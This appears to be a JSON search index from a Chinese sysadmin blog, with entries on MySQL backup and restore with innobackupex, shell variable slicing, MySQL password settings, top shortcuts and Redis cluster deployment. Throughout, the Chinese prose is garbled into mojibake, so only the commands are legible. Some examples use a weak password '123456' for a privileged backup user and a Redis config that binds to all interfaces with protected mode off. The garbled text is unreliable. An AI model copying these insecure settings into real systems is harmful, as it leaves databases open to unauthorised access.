â€“incremental-basedir=/data/backup/incremental/2019-11-06_15-19-32/ â€“parallel=2 å¢é‡å¤‡ä»½çš„æ¢å¤ï¼š Â  1.åº”ç”¨äº‹åŠ¡æ—¥å¿—çš„æäº¤ï¼Œä¸æ‰§è¡Œå›æ»š innobackupex --apply-log --redo-only /data/backup/full/2019-11-06_15-04-50/ 2.æ‰§è¡Œç¬¬ä¸€ä¸ªå¢é‡å¤‡ä»½çš„æ¢å¤ innobackupex --apply-log --redo-only /data/backup/full/2019-11-06_15-04-50/ --incremental-dir=/data/backup/incremental/2019-11-06_15-19-32/ 3.æ‰§è¡Œç¬¬äºŒä¸ªå¢é‡å¤‡ä»½çš„æ¢å¤ï¼ˆæ¢å¤æœ€åä¸€ä¸ªå¢é‡å¤‡ä»½çš„æ—¶å€™éœ€è¦å»æ‰redo-onlyå‚æ•°ï¼‰ innobackupex --apply-log /data/backup/full/2019-11-06_15-04-50/ --incremental-dir=/data/backup/incremental/2019-11-06_15-32-05/ 4.æŠŠæ‰€æœ‰åˆåœ¨ä¸€èµ·çš„å®Œå…¨å¤‡ä»½æ•´ä½“è¿›è¡Œä¸€æ¬¡applyæ“ä½œï¼Œå›æ»šæœªæäº¤çš„æ•°æ®ï¼š innobackupex --apply-log /data/backup/full/2019-11-06_15-04-50/ 5.å°†å¤‡ä»½æ¢å¤åˆ°mysqlæ•°æ®æ–‡ä»¶ç›®å½• #æ¨¡æ‹Ÿæ•…éšœ mv /data/mysql{,2} systemctl stop mysqld #æ‰§è¡Œæ¢å¤ï¼Œä¹Ÿå¯ä»¥æ‰§è¡Œcp -rå‘½ä»¤æ‰‹åŠ¨æ¢å¤ innobackupex --defaults-file=/etc/my.cnf --copy-back --rsync /data/backup/full/2019-11-06_15-04-50/ #ä¿®æ”¹æƒé™å¯åŠ¨mysql chown -R mysql.mysql mysql systemctl start mysqld ","date":"2019-11-06 16:12","objectID":"/post/1083/:0:0","tags":["mysql"],"title":"ä½¿ç”¨xtrbackup(innobackupex)å¢é‡å¤‡ä»½mysql(äºŒ)","uri":"/post/1083/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"è·å–å˜é‡é•¿åº¦ï¼š [root@soulchild ~]# content=soulchild [root@soulchild ~]# echo ${content} soulchild #åŠ äº•å· [root@soulchild ~]# echo ${#content} 9 #ä½¿ç”¨expr [root@soulchild ~]# expr length ${content} 9 #ä½¿ç”¨awk [root@soulchild ~]# echo $content | awk '{print length}' 9 å˜é‡åˆ‡ç‰‡ï¼š #ä»ç¬¬å››ä¸ªå­—ç¬¦å¼€å§‹å–å€¼ï¼Œå–5ä¸ªå­—ç¬¦ [root@soulchild ~]# echo ${content:4:5} child ","date":"2019-11-04 18:49","objectID":"/post/1042/:0:0","tags":["shell"],"title":"è·å–å˜é‡é•¿åº¦å’Œå˜é‡åˆ‡ç‰‡","uri":"/post/1042/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"è¿›å…¥mysqlå‘½ä»¤è¡Œæ‰§è¡Œï¼š #æ”¹å¯†ç  SET PASSWORD = PASSWORD(â€˜12345â€™); #è®¾ç½®å¯†ç æ°¸ä¸è¿‡æœŸ ALTER USER â€˜rootâ€™@â€™localhostâ€™ PASSWORD EXPIRE NEVER; #åˆ·æ–°æƒé™è¡¨ flush privileges; ","date":"2019-11-04 18:48","objectID":"/post/1045/:0:0","tags":["mysql"],"title":"mysqlä¿®æ”¹å¯†ç å’Œè®¾ç½®å¯†ç æ°¸ä¸è¿‡æœŸ","uri":"/post/1045/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"Â 1 é¦–å…ˆä¼šå¯åŠ¨ä¸€ä¸ªxtrabackup_logåå°æ£€æµ‹çš„è¿›ç¨‹ï¼Œå®æ—¶æ£€æµ‹mysql äº‹åŠ¡æ—¥å¿—redoçš„å˜åŒ–ï¼Œä¸€æ—¦å‘ç°redoæœ‰æ–°çš„æ—¥å¿—å†™å…¥ï¼Œç«‹åˆ»å°†æ—¥å¿—å†™å…¥åˆ°æ—¥å¿—æ–‡ä»¶xtrabackup_logfileä¸­ 2 å¤åˆ¶innodbçš„æ•°æ®æ–‡ä»¶å’Œç³»ç»Ÿè¡¨ç©ºé—´æ–‡ä»¶idbdata1åˆ°å¯¹åº”çš„ä»¥é»˜è®¤æ—¶é—´æˆ³ä¸ºå¤‡ä»½ç›®å½•çš„åœ°æ–¹ã€‚ 3 å¤åˆ¶ç»“æŸåï¼Œæ‰§è¡Œflush table with read locké”è¡¨æ“ä½œã€‚ï¼ˆMyISAMå¼•æ“ç”±äºä¸æ”¯æŒäº‹åŠ¡æ—¥å¿—ï¼Œæ‰€ä»¥ä¼šè¿›è¡Œé”è¡¨ã€‚ï¼‰ 4 å¤åˆ¶.frmï¼ŒMYIï¼ŒMYDæ–‡ä»¶ã€‚ 5 å¹¶ä¸”åœ¨è¿™ä¸€æ—¶åˆ»è·å¾—binary log çš„ä½ç½®ã€‚ 6 å°†è¡¨è¿›è¡Œè§£é”unlock tablesã€‚ 7 åœæ­¢xtrabackup_logè¿›ç¨‹ã€‚ ","date":"2019-11-04 18:43","objectID":"/post/1067/:0:0","tags":["mysql"],"title":"Innobackupex(xtrabackup)å®Œå…¨å¤‡ä»½Mysqlè¿‡ç¨‹","uri":"/post/1067/"},{"categories":["å…¶ä»–"],"content":"æŠ¥é”™ï¼š Canâ€™t locate Digest/MD5.pm in @INC (@INC contains: /usr/local/lib64/perl5 /usr/local/share/perl5 /usr/lib64/perl5/vendor_perl /usr/share/perl5/vendor_perl /usr/lib64/perl5 /usr/share/perl5 .) at - line 693. BEGIN failedâ€“compilation aborted at - line 693. è§£å†³æ–¹æ³•ï¼š å®‰è£…perl-Digest-MD5 yum -y install perl-Digest-MD5 ","date":"2019-11-04 18:19","objectID":"/post/1063/:0:0","tags":["mysql"],"title":"ä½¿ç”¨xtrabackupæŠ¥é”™Can't locate DigestMD5.pm in ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚BEGIN failed--compilation aborted at - line 693.","uri":"/post/1063/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"ç‰ˆæœ¬å¯¹åº”å…³ç³»ï¼š mysql 5.1 â€“ xtrabackup2.0 mysql5.6 â€“xtrabackup 2.2 mysql5.7 â€“xtrabackup2.4 mysql8.0 â€“xtrabackup8.0 xtrbackupå·¥å…·ä¸‹è½½å®‰è£…ï¼š 2.4ï¼š https://www.percona.com/downloads/Percona-XtraBackup-2.4/LATEST/ 8.0ï¼š https://www.percona.com/downloads/Percona-XtraBackup-LATEST/ yumæ–¹å¼å®‰è£…ï¼š wget https://www.percona.com/redir/downloads/percona-release/redhat/1.0-13/percona-release-1.0-13.noarch.rpm rpm -ivhÂ percona-release-1.0-13.noarch.rpm yum install percona-xtrabackup-24 ç›´æ¥ä¸‹è½½å®‰è£…ï¼š wget https://www.percona.com/downloads/XtraBackup/Percona-XtraBackup-2.4.4/binary/redhat/7/x86_64/percona-xtrabackup-24-2.4.4-1.el7.x86_64.rpm yum localinstallÂ percona-xtrabackup-24-2.4.4-1.el7.x86_64.rpm innobackupexçš„å¸¸ç”¨é€‰é¡¹ï¼š â€“default-filesï¼šå¯é€šè¿‡æ­¤é€‰é¡¹æŒ‡å®šå…¶å®ƒçš„é…ç½®æ–‡ä»¶ï¼›ä½†æ˜¯ä½¿ç”¨æ—¶å¿…é¡»æ”¾äºæ‰€æœ‰é€‰é¡¹çš„æœ€å‰é¢ â€“hostï¼šæŒ‡å®šæ•°æ®åº“æœåŠ¡å™¨åœ°å€ â€“portï¼šæŒ‡å®šè¿æ¥åˆ°æ•°æ®åº“æœåŠ¡å™¨çš„å“ªä¸ªç«¯å£ â€“socketï¼šè¿æ¥æœ¬åœ°æ•°æ®åº“æ—¶ä½¿ç”¨çš„å¥—æ¥å­—æ–‡ä»¶è·¯å¾„ â€“no-timestampï¼šåœ¨ä½¿ç”¨innobackupexè¿›è¡Œå¤‡ä»½æ—¶ï¼Œå¯ä½¿ç”¨â€“no-timestampé€‰é¡¹æ¥é˜»æ­¢å‘½ä»¤è‡ªåŠ¨åˆ›å»ºä¸€ä¸ªä»¥æ—¶é—´å‘½åçš„ç›®å½•ï¼›å¦‚æ­¤ä¸€æ¥ï¼Œinnobackupexå‘½ä»¤å°†ä¼šåˆ›å»ºä¸€ä¸ªBACKUP-DIRç›®å½•æ¥å­˜å‚¨å¤‡ä»½æ•°æ® â€“incrementalï¼šæŒ‡å®šå¢é‡å¤‡ä»½è·¯å¾„ â€“incremental-basedirï¼šæŒ‡å®šåŸºäºå“ªä¸ªå¤‡ä»½åšå¢é‡å¤‡ä»½ â€“apply-logï¼šæŒ‡å®šxtrabackup_logfileæ–‡ä»¶ï¼Œä¸€èˆ¬æƒ…å†µä¸‹,åœ¨å¤‡ä»½å®Œæˆåï¼Œæ•°æ®å°šä¸”ä¸èƒ½ç”¨äºæ¢å¤æ“ä½œï¼Œå› ä¸ºå¤‡ä»½çš„æ•°æ®ä¸­å¯èƒ½ä¼šåŒ…å«å°šæœªæäº¤çš„äº‹åŠ¡æˆ–å·²ç»æäº¤ä½†å°šæœªåŒæ­¥è‡³æ•°æ®æ–‡ä»¶ä¸­çš„äº‹åŠ¡ã€‚å› æ­¤ï¼Œæ­¤æ—¶æ•°æ® æ–‡ä»¶ä»å¤„ç†ä¸ä¸€è‡´çŠ¶æ€ã€‚â€“apply-logçš„ä½œç”¨æ˜¯é€šè¿‡å›æ»šæœªæäº¤çš„äº‹åŠ¡åŠåŒæ­¥å·²ç»æäº¤çš„äº‹åŠ¡è‡³æ•°æ®æ–‡ä»¶ä½¿æ•°æ®æ–‡ä»¶å¤„äºä¸€è‡´æ€§çŠ¶æ€ã€‚ â€“redo-onlyï¼šåªé‡åšå·²æäº¤çš„äº‹åŠ¡ï¼Œä¸å›æ»šæœªæäº¤çš„äº‹åŠ¡ â€“use-memoryï¼šåœ¨â€œå‡†å¤‡â€é˜¶æ®µå¯æä¾›å¤šå°‘å†…å­˜ä»¥åŠ é€Ÿå¤„ç†ï¼Œé»˜è®¤æ˜¯100M â€“copy-backï¼šæŒ‡å®šæ¢å¤æ•°æ®ç›®å½•ï¼Œæ•°æ®åº“æœåŠ¡å™¨çš„æ•°æ®ç›®å½• â€“compactï¼šå‹ç¼©å¤‡ä»½ â€“stream={tar|xbstream}ï¼šå¯¹å¤‡ä»½çš„æ•°æ®æµå¼åŒ–å¤„ç† â€“parallel=2ï¼šæŒ‡å®šçº¿ç¨‹æ•° å…¨å¤‡ä»½ï¼š Â  1ï¼‰åˆ›å»ºå¤‡ä»½ç”¨æˆ· grant reload,lock tables,replication client,create tablespace,super on *.* to bakuser@'172.16.213.%' identified by '123456'; 2ï¼‰è¿›è¡Œå…¨åº“å¤‡ä»½ innobackupex --defaults-file=/etc/my.cnf --user=bakuser --password=123456Â --socket=/tmp/mysql.sockÂ /data/backup/full/ ä½¿ç”¨innobakupexå¤‡ä»½æ—¶ï¼Œå…¶ä¼šè°ƒç”¨xtrabackupå¤‡ä»½æ‰€æœ‰çš„InnoDBè¡¨ï¼Œå¤åˆ¶æ‰€æœ‰å…³äºè¡¨ç»“æ„å®šä¹‰çš„ç›¸å…³æ–‡ä»¶(.frm)ã€ä»¥åŠMyISAMã€MERGEã€CSVå’ŒARCHIVEè¡¨çš„ç›¸å…³æ–‡ä»¶ï¼ŒåŒæ—¶è¿˜ä¼šå¤‡ä»½è§¦å‘å™¨å’Œæ•°æ®åº“é…ç½®ä¿¡æ¯ç›¸å…³çš„æ–‡ä»¶ã€‚è¿™äº›æ–‡ä»¶ä¼šè¢«ä¿å­˜è‡³ä¸€ä¸ªä»¥æ—¶é—´æˆ³å‘½åçš„ç›®å½•ä¸­ã€‚ å…¨å¤‡æ¢å¤ï¼š Â  1.åœæ­¢æ•°æ®åº“ systemctl stop mysqld 2.æ¨¡æ‹Ÿæ•…éšœ mv /data/mysql /data/mysql.bak 3.åˆ›å»ºç›®å½• mkdir -p /data/mysql 4.å¼€å§‹æ¢å¤ #innodbå¼•æ“éœ€è¦æ‰§è¡Œï¼Œåº”ç”¨äº‹åŠ¡æ—¥å¿—çš„æäº¤å’Œå›æ»š innobackupex â€“apply-log /data/backup/full/2019-11-04_19-09-48/ #æ¢å¤ï¼Œä¹Ÿå¯ä»¥æ‰§è¡Œcp -rå‘½ä»¤æ‰‹åŠ¨æ¢å¤ innobackupex â€“default-file=/etc/my.cnf â€“copy-back /data/backup/full/2019-11-04_19-09-48/ #èµ‹äºˆæƒé™ chown -R mysql.mysql /data/mysql æŒ‡å®šåº“å¤‡ä»½ï¼š Â  æŒ‡å®šå•åº“ï¼š â€“databases=wordpress æŒ‡å®šå¤šåº“,ä½¿ç”¨ç©ºæ ¼åˆ†éš”ï¼š â€“databases=â€œwordpress emlogâ€ innobackupex --defaults-file=/etc/my.cnf --user=bakuser --password=123456Â --socket=/tmp/mysql.sockÂ --databases=wordpress /data/backup/blog/ æŒ‡å®šåº“æ¢å¤ï¼š Â  1.æ¨¡æ‹Ÿæ•…éšœ mysql\u003eÂ delete from admin where id=3; 2.åœæ­¢æ•°æ®åº“ systemctl stop mysqld 3.innodbå¼•æ“éœ€è¦æ‰§è¡Œï¼Œåº”ç”¨äº‹åŠ¡æ—¥å¿—çš„æäº¤å’Œå›æ»š innobackupex â€“apply-log /data/backup/blog/2019-11-06_17-27-50 #æ¢å¤ cp -r /data/backup/blog/2019-11-06_17-27-50/emlog/ /data/mysql/ ","date":"2019-11-04 17:11","objectID":"/post/1049/:0:0","tags":["mysql"],"title":"ä½¿ç”¨xtrbackup(innobackupex)å…¨é‡å¤‡ä»½mysql(ä¸€)","uri":"/post/1049/"},{"categories":["åŸºç¡€å†…å®¹","å¸¸ç”¨å‘½ä»¤"],"content":"cï¼š æ˜¾ç¤ºå®Œæ•´çš„å‘½ä»¤ dï¼š æ›´æ”¹åˆ·æ–°é¢‘ç‡ fï¼š å¢åŠ æˆ–å‡å°‘è¦æ˜¾ç¤ºçš„åˆ—(é€‰ä¸­çš„ä¼šå˜æˆå¤§å†™å¹¶åŠ *å·) Fï¼š é€‰æ‹©æ’åºçš„åˆ— hï¼š æ˜¾ç¤ºå¸®åŠ©ç”»é¢ Hï¼š æ˜¾ç¤ºçº¿ç¨‹ iï¼š å¿½ç•¥é—²ç½®å’Œåƒµæ­»è¿›ç¨‹ kï¼š é€šè¿‡ç»™äºˆä¸€ä¸ªPIDå’Œä¸€ä¸ªsignalæ¥ç»ˆæ­¢ä¸€ä¸ªè¿›ç¨‹ã€‚ï¼ˆé»˜è®¤signalä¸º15ã€‚åœ¨å®‰å…¨æ¨¡å¼ä¸­æ­¤å‘½ä»¤è¢«å±è”½ï¼‰ l: æ˜¾ç¤ºå¹³å‡è´Ÿè½½ä»¥åŠå¯åŠ¨æ—¶é—´ï¼ˆå³æ˜¾ç¤ºå½±è—ç¬¬ä¸€è¡Œï¼‰ mï¼š æ˜¾ç¤ºå†…å­˜ä¿¡æ¯ Mï¼š æ ¹æ®å†…å­˜èµ„æºä½¿ç”¨å¤§å°è¿›è¡Œæ’åº Nï¼š æŒ‰PIDç”±é«˜åˆ°ä½æ’åˆ— oï¼š æ”¹å˜åˆ—æ˜¾ç¤ºçš„é¡ºåº Oï¼š é€‰æ‹©æ’åºçš„åˆ—ï¼Œä¸Få®Œå…¨ç›¸åŒ Pï¼š æ ¹æ®CPUèµ„æºä½¿ç”¨å¤§å°è¿›è¡Œæ’åº qï¼š é€€å‡ºtopå‘½ä»¤ rï¼š ä¿®æ”¹è¿›ç¨‹çš„niceå€¼(ä¼˜å…ˆçº§)ã€‚ä¼˜å…ˆçº§é»˜è®¤ä¸º10ï¼Œæ­£å€¼ä½¿ä¼˜å…ˆçº§é™ä½ï¼Œåä¹‹åˆ™æé«˜çš„ä¼˜å…ˆçº§ sï¼š è®¾ç½®åˆ·æ–°é¢‘ç‡ï¼ˆé»˜è®¤å•ä½ä¸ºç§’ï¼Œå¦‚æœ‰å°æ•°åˆ™æ¢ç®—æˆmsï¼‰ã€‚é»˜è®¤å€¼æ˜¯5sï¼Œè¾“å…¥0å€¼åˆ™ç³»ç»Ÿå°†ä¸æ–­åˆ·æ–° Sï¼š ç´¯è®¡æ¨¡å¼ï¼ˆæŠŠå·²å®Œæˆæˆ–é€€å‡ºçš„å­è¿›ç¨‹å ç”¨çš„CPUæ—¶é—´ç´¯è®¡åˆ°çˆ¶è¿›ç¨‹çš„MITE+ ï¼‰ Tï¼š æ ¹æ®è¿›ç¨‹ä½¿ç”¨CPUçš„ç´¯ç§¯æ—¶é—´æ’åº tï¼š æ˜¾ç¤ºè¿›ç¨‹å’ŒCPUçŠ¶æ€ä¿¡æ¯ï¼ˆå³æ˜¾ç¤ºå½±è—CPUè¡Œï¼‰ uï¼š æŒ‡å®šç”¨æˆ·è¿›ç¨‹ Wï¼š å°†å½“å‰è®¾ç½®å†™å…¥~/.toprcæ–‡ä»¶ï¼Œä¸‹æ¬¡å¯åŠ¨è‡ªåŠ¨è°ƒç”¨toprcæ–‡ä»¶çš„è®¾ç½® \u003cï¼š å‘å‰ç¿»é¡µ \u003eï¼š å‘åç¿»é¡µ ?ï¼š æ˜¾ç¤ºå¸®åŠ©ç”»é¢ 1(æ•°å­—1)ï¼š æ˜¾ç¤ºæ¯ä¸ªCPUçš„è¯¦ç»†æƒ…å†µ ","date":"2019-10-23 22:32","objectID":"/post/921/:0:0","tags":[],"title":"topå‘½ä»¤å¿«æ·é”®","uri":"/post/921/"},{"categories":["å…¶ä»–"],"content":"java -jar -Dspring.cloud.inetutils.preferred-networks=192.168.20.123 ","date":"2019-10-23 22:32","objectID":"/post/1007/:0:0","tags":["java"],"title":"jaråŒ…æŒ‡å®šipæ³¨å†Œeureka","uri":"/post/1007/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"1.å®‰è£…redis yum install -y gcc-c++ wget http://download.redis.io/releases/redis-5.0.5.tar.gz tar xf redis-5.0.5.tar.gz -C /server cd /server/redis-5.0.5 make mkdir /usr/local/redis/{etc,log} -p make install PREFIX=/usr/local/redis cp redis.conf sentinel.conf /usr/local/redis/etc/ ä¿®æ”¹ç¯å¢ƒå˜é‡ vim /etc/profile export PATH=$PATH:/usr/local/redis/bin source /etc/profile ","date":"2019-10-07 22:13","objectID":"/post/2761/:0:1","tags":["redis"],"title":"redis-clusteréƒ¨ç½²","uri":"/post/2761/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"2.redisæ¨¡æ¿é…ç½®æ–‡ä»¶ cat redis.conf.tpl \u003eEOF daemonize yes port 7000 dir /usr/local/redis dbfilename \"7000.rdb\" cluster-enabled yes cluster-config-file \"/usr/local/redis/etc/redis-cluster-7000.conf\" cluster-node-timeout 50000 # è¿™ä¸ªå‚æ•°ä¸ºno è¡¨ç¤ºå½“é›†ç¾¤ä¸­ä¸€ä¸ªèŠ‚ç‚¹æ•…éšœæ—¶,é›†ç¾¤æ•´ä½“å¯ç”¨,åªæœ‰å­˜åœ¨æ•…éšœèŠ‚ç‚¹çš„æ•°æ®ä¸èƒ½æŸ¥è¯¢å†™å…¥ cluster-require-full-coverage no client-output-buffer-limit normal 0 0 0 client-output-buffer-limit slave 256mb 64mb 60 client-output-buffer-limit pubsub 32mb 8mb 60 bind 0.0.0.0 protected-mode no save \"\" appendonly no logfile \"/usr/local/redis/log/7000.log\" EOF client-output-buffer-limit å‚æ•°å«ä¹‰: Redisä¸ºäº†è§£å†³è¾“å‡ºç¼“å†²åŒºæ¶ˆæ¯å¤§é‡å †ç§¯çš„éšæ‚£ï¼Œè®¾ç½®äº†ä¸€äº›ä¿æŠ¤æœºåˆ¶ï¼Œä¸»è¦é‡‡ç”¨ä¸¤ç§é™åˆ¶æªæ–½ï¼š å¤§å°é™åˆ¶ï¼Œå½“æŸä¸€å®¢æˆ·ç«¯ç¼“å†²åŒºè¶…è¿‡è®¾å®šå€¼åç›´æ¥å…³é—­è¿æ¥ï¼› æŒç»­æ€§é™åˆ¶ï¼Œå½“æŸä¸€å®¢æˆ·ç«¯ç¼“å†²åŒºæŒç»­ä¸€æ®µæ—¶é—´å ç”¨è¿‡å¤§ç©ºé—´æ—¶å…³é—­è¿æ¥ã€‚ åé¢ä¸‰ä¸ªå‚æ•°åˆ†åˆ«è¡¨ç¤º æœ€å¤§é™åˆ¶ æœ€å°é™åˆ¶ æœ€å°é™åˆ¶çš„æŒç»­æ—¶é—´ ä¸åŒå®¢æˆ·ç«¯æœ‰ä¸åŒç­–ç•¥ï¼Œç­–ç•¥å¦‚ä¸‹ï¼š å¯¹äºæ™®é€šå®¢æˆ·ç«¯æ¥è¯´ï¼Œé™åˆ¶ä¸º0ï¼Œä¹Ÿå°±æ˜¯ä¸é™åˆ¶ã€‚å› ä¸ºæ™®é€šå®¢æˆ·ç«¯é€šå¸¸é‡‡ç”¨é˜»å¡å¼çš„æ¶ˆæ¯åº”ç­”æ¨¡å¼ï¼Œä½•è°“é˜»å¡å¼å‘¢ï¼Ÿå¦‚ï¼šå‘é€è¯·æ±‚ï¼Œç­‰å¾…è¿”å›ï¼Œå†å‘é€è¯·æ±‚ï¼Œå†ç­‰å¾…è¿”å›ã€‚è¿™ç§æ¨¡å¼ä¸‹ï¼Œé€šå¸¸ä¸ä¼šå¯¼è‡´RedisæœåŠ¡å™¨è¾“å‡ºç¼“å†²åŒºçš„å †ç§¯è†¨èƒ€ï¼› å¯¹äºPub/Subå®¢æˆ·ç«¯ï¼ˆä¹Ÿå°±æ˜¯å‘å¸ƒ/è®¢é˜…æ¨¡å¼ï¼‰ï¼Œå¤§å°é™åˆ¶æ˜¯32Mï¼Œå½“è¾“å‡ºç¼“å†²åŒºè¶…è¿‡32Mæ—¶ï¼Œä¼šå…³é—­è¿æ¥ã€‚æŒç»­æ€§é™åˆ¶æ˜¯ï¼Œå½“å®¢æˆ·ç«¯ç¼“å†²åŒºå¤§å°æŒç»­60ç§’è¶…è¿‡8Mï¼Œåˆ™å…³é—­å®¢æˆ·ç«¯è¿æ¥ï¼› å¯¹äºslaveå®¢æˆ·ç«¯æ¥è¯´ï¼Œå¤§å°é™åˆ¶æ˜¯256Mï¼ŒæŒç»­æ€§é™åˆ¶æ˜¯å½“å®¢æˆ·ç«¯ç¼“å†²åŒºå¤§å°æŒç»­60ç§’è¶…è¿‡64Mï¼Œåˆ™å…³é—­å®¢æˆ·ç«¯è¿æ¥ã€‚ ä¿®æ”¹å…¶ä»–å®ä¾‹é…ç½® for i in {7000..7005};do cp redis.conf.tpl redis-$i.conf;done for i in {7001..7005};do sed -i s#7000#$i# redis-$i.conf; done ","date":"2019-10-07 22:13","objectID":"/post/2761/:0:2","tags":["redis"],"title":"redis-clusteréƒ¨ç½²","uri":"/post/2761/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"3.å¯åŠ¨æ‰€æœ‰å®ä¾‹ for i in {7000..7005};do redis-server redis-$i.conf; done ","date":"2019-10-07 22:13","objectID":"/post/2761/:0:3","tags":["redis"],"title":"redis-clusteréƒ¨ç½²","uri":"/post/2761/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"4.åˆå§‹åŒ–é›†ç¾¤ # æŒ‡å®šæ‰€æœ‰èŠ‚ç‚¹çš„åœ°å€ï¼Œå¹¶ä¸”å£°æ˜éœ€è¦ä¸€ä¸ªå‰¯æœ¬ã€‚æœ€ç»ˆç»“æœæ˜¯3ä¸»3ä»ï¼Œæ¯ä¸ªä¸»å¸¦ä¸€ä¸ªä»ã€‚ redis-cli --cluster create --cluster-replicas 1 10.23.40.38:7000 10.23.40.38:7001 10.23.40.38:7002 10.23.40.38:7003 10.23.40.38:7004 10.23.40.38:7005 ","date":"2019-10-07 22:13","objectID":"/post/2761/:0:4","tags":["redis"],"title":"redis-clusteréƒ¨ç½²","uri":"/post/2761/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"5.æµ‹è¯• [root@localhost etc]# redis-cli -c -p 7000 127.0.0.1:7000\u003e set name soulchild -\u003e Redirected to slot [5798] located at 10.23.40.38:7001 OK 10.23.40.38:7000\u003e get name -\u003e Redirected to slot [5798] located at 10.23.40.38:7001 \"soulchild\" # åœæ­¢7001ä¸»èŠ‚ç‚¹ redis-cli -p 7001 shutdown # æŸ¥çœ‹keyï¼Œå¯ä»¥çœ‹åˆ°å·²ç»åˆ°7005èŠ‚ç‚¹äº† [root@10-23-40-38 ~]# redis-cli -c -p 7000 127.0.0.1:7000\u003e get name -\u003e Redirected to slot [5798] located at 10.23.40.38:7005 \"soulchild\" ","date":"2019-10-07 22:13","objectID":"/post/2761/:0:5","tags":["redis"],"title":"redis-clusteréƒ¨ç½²","uri":"/post/2761/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"6.æ‰©å®¹èŠ‚ç‚¹ é…ç½®å¥½åå¯åŠ¨redisï¼Œæ·»åŠ åˆ°é›†ç¾¤çš„æ–¹æ³•å¦‚ä¸‹ # ä¸»èŠ‚ç‚¹èº«ä»½åŠ å…¥ # ç¬¬ä¸€ä¸ªåœ°å€æ˜¯æ–°èŠ‚ç‚¹åœ°å€ã€‚ç¬¬äºŒä¸ªåœ°å€æ˜¯é›†ç¾¤ä¸­å·²å­˜åœ¨çš„èŠ‚ç‚¹ï¼Œå¯ä»¥æ˜¯é›†ç¾¤ä¸­çš„ä»»æ„ä¸€ä¸ªèŠ‚ç‚¹ redis-cli --cluster add-node 10.23.40.38:7006 10.23.40.38:7001 # ä»èŠ‚ç‚¹èº«ä»½åŠ å…¥ # --cluster-slaveè¡¨ç¤ºä»èŠ‚ç‚¹èº«ä»½åŠ å…¥ # --cluster-master-idæŒ‡å®šè·Ÿéšå“ªä¸ªä¸»èŠ‚ç‚¹ï¼Œidå¯ä»¥é€šè¿‡cluster nodesè·å– redis-cli --cluster add-node 10.23.40.38:7007 10.23.40.38:7001 --cluster-slave --cluster-master-id d67d00c2741f89ddee5a17f8c0715f29690b12c2 åˆ†é…æ§½ä½ ååŠ å…¥é›†ç¾¤çš„èŠ‚ç‚¹æ˜¯æ²¡æœ‰åˆ†é…æ§½ä½çš„ï¼Œä¸ä¼šæœ‰æ•°æ®å†™åˆ°æ–°çš„èŠ‚ç‚¹ï¼Œæ‰€ä»¥éœ€è¦ä¸ºæ–°èŠ‚ç‚¹åˆ†é…æ§½ä½ 75807-1am09rzy4q5.png ","date":"2019-10-07 22:13","objectID":"/post/2761/:0:6","tags":["redis"],"title":"redis-clusteréƒ¨ç½²","uri":"/post/2761/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"7.åˆ é™¤èŠ‚ç‚¹ ç“œåˆ†è¦åˆ é™¤èŠ‚ç‚¹çš„æ§½ä½ # è¿æ¥åœ°å€æ˜¯é›†ç¾¤ä¸­ä»»æ„èŠ‚ç‚¹ # --cluster-fromè¦ç“œåˆ†å“ªä¸ªèŠ‚ç‚¹çš„æ§½ä½ # --cluster-to è¦ç“œåˆ†ç»™è° # --cluster-slots è¦ç“œåˆ†å¤šå°‘ä¸ª redis-cli --cluster reshard 10.23.40.38:7000 --cluster-from d67d00c2741f89ddee5a17f8c0715f29690b12c2 --cluster-to 79b6fe95c1284b8d868850e41ad01fc778030f5b --cluster-slots 1365 redis-cli --cluster reshard 10.23.40.38:7000 --cluster-from d67d00c2741f89ddee5a17f8c0715f29690b12c2 --cluster-to bc23087af4d92032f02bd096df6c663933b74938 --cluster-slots 1366 redis-cli --cluster reshard 10.23.40.38:7000 --cluster-from d67d00c2741f89ddee5a17f8c0715f29690b12c2 --cluster-to 7e333cb6b22bf0f81a6bdf72a217c9713bd319f5 --cluster-slots 1365 åˆ é™¤èŠ‚ç‚¹ # idé€šè¿‡cluster nodesè·å– redis-cli --cluster del-node 10.23.40.38:7000 d67d00c2741f89ddee5a17f8c0715f29690b12c2 ","date":"2019-10-07 22:13","objectID":"/post/2761/:0:7","tags":["redis"],"title":"redis-clusteréƒ¨ç½²","uri":"/post/2761/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"8.å¸¸ç”¨å‘½ä»¤ clusterç›¸å…³å‘½ä»¤: https://redis.io/commands/#cluster é›†ç¾¤èŠ‚ç‚¹çŠ¶æ€ cluster nodes æ˜¾ç¤ºæ ¼å¼ï¼š ip:port@cport â€¦ é›†ç¾¤çŠ¶æ€ cluster info ","date":"2019-10-07 22:13","objectID":"/post/2761/:0:8","tags":["redis"],"title":"redis-clusteréƒ¨ç½²","uri":"/post/2761/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"æœ€æ–°ç¨³å®šç‰ˆä¸‹è½½åœ°å€ï¼šhttp://download.redis.io/releases/redis-5.0.5.tar.gz ","date":"2019-10-07 12:02","objectID":"/post/976/:0:0","tags":["redis"],"title":"rediså®‰è£…å’ŒåŸºç¡€è°ƒä¼˜","uri":"/post/976/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"ä¸€ã€å®‰è£… yum install -y gcc-c++ wgetÂ http://download.redis.io/releases/redis-5.0.5.tar.gz tar xf redis-5.0.5.tar.gz -C /server cd /server/redis-5.0.5 make mkdir /usr/local/redis make install PREFIX=/usr/local/redis ","date":"2019-10-07 12:02","objectID":"/post/976/:0:1","tags":["redis"],"title":"rediså®‰è£…å’ŒåŸºç¡€è°ƒä¼˜","uri":"/post/976/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"é…ç½®æ–‡ä»¶ mkdir /usr/local/redis/{etc,log} cdÂ /server/redis-5.0.5 cp redis.conf sentinel.conf /usr/local/redis/etc/ å¸¸ç”¨äºŒè¿›åˆ¶å‘½ä»¤åŠŸèƒ½ä»‹ç»ï¼š 